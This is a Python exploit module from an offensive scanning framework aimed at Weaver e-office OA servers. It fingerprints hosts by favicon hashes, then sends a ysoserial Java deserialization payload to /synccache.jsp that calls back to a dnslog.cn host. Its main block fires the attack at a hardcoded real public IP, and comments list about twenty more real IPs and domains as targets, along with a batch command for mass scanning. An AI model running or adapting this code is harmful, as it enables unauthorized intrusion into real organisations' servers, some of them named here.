# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-20 11:05

import hashlib
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.request.asynchttp import *

# module rule
from core.variablemanager import GlobalVariableManager



# app="泛微-协同办公OA"
# python batch.py -m exploit.web.OA.Weaver.e-weaver.deserialize_synccache -cs -fs "app=\"泛微-协同办公OA\""

class Script(BaseScript):
    name = 'E-Weaver'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.DESERIALIZE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/synccache.jsp']
        # session
        self.session = session
        # 相关信息
        self.info = ''
        self.favicon = ['41eca7a9245394106a09b2534d8030df',
                        '281348dd57383c1f214ffb8aed3a1210',
                        '9b1d3f08ede38dbe699d6b2e72a8febb',
                        'c27547e27e1d2c7514545cd8d5988946']

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout,
                                            verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        await asyncio.sleep(2)
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5:
                                self.flag = True
                                self.addInGlobalVariable(self.name)
                                tqdm.write(Fore.RED + '[{}] {}'.format('E-Weaver Finger', url))
                                return {'name': 'E-Weaver Finger', 'url': url, 'software': 'E-Weaver'}
        except Exception:
            return None

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                # 我这里通过yso生成的，测试URLDNS，后面用Base64.encodeBase64String 返回的即可
                '''
                    public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
                    // ensure payload generation doesn't throw an exception
                    byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>(){
                        public byte[] call() throws Exception {
                            final String command = args.length > 0 && args[0] != null ? args[0] : getDefaultTestCmd();
            
                            System.out.println("generating payload object(s) for command: '" + command + "'");
            
                            ObjectPayload<?> payload = clazz.newInstance();
                            final Object objBefore = payload.getObject(command);
            
                            System.out.println("serializing payload");
                            byte[] ser = Serializer.serialize(objBefore);
                            System.out.println(Base64.encodeBase64String(ser));
                            Utils.releasePayload(payload, objBefore);
                            return ser;
                    }});
                '''
                data = '''data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAEDZ3NjMxYi5kbnNsb2cuY250AABxAH4ABXQABGh0dHBweHQAF2h0dHA6Ly82dzYzMWIuZG5zbG9nLmNueA=='''
                async with self.session.post(url=url, data=data, headers=headers, timeout=self.reqTimeout,
                                             allow_redirects=False,
                                             verify_ssl=False) as response:
                    if response is not None:
                        await asyncio.sleep(2)
                        if response.status == 200:
                            tqdm.write(Fore.RED + '[{}] {}'.format('E-Weaver Deserialize', url))
                            return {'name': 'E-Weaver Deserialize', 'url': url, 'software': 'E-Weaver'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib
    import subprocess
    import base64

    #
    # #
    # resp = requests.get('http://58.221.135.158:82/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)

    semaphore = asyncio.Semaphore(500)
    sc = Script('202.105.136.162:81', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
    # for _ in ['180.153.180.97:8087', '113.90.221.84:8089', '113.90.184.101:8008', '47.108.27.135:89',
    #           '221.237.114.225:8000',
    #           'https://58.33.210.89:9443', '202.105.136.162:81', '222.85.134.63:88', 'https://58.240.116.12',
    #           '218.4.251.92:8888', 'oa.sinoma.cc:8081', 'https://61.153.20.105:8002', '113.88.240.193:8060',
    #           '223.84.248.8:8888',
    #           '112.124.107.128:8088', '183.245.121.75:8080', '123.52.54.88:876', '39.101.137.138:8080',
    #           '123.52.54.88:2031',
    #           '47.108.176.97', '182.150.44.162:81']:
    #     print(_)
    #     sc = Script(_, 1)
    #     l = asyncio.get_event_loop()
    #     l.run_until_complete(sc.attack(semaphore))
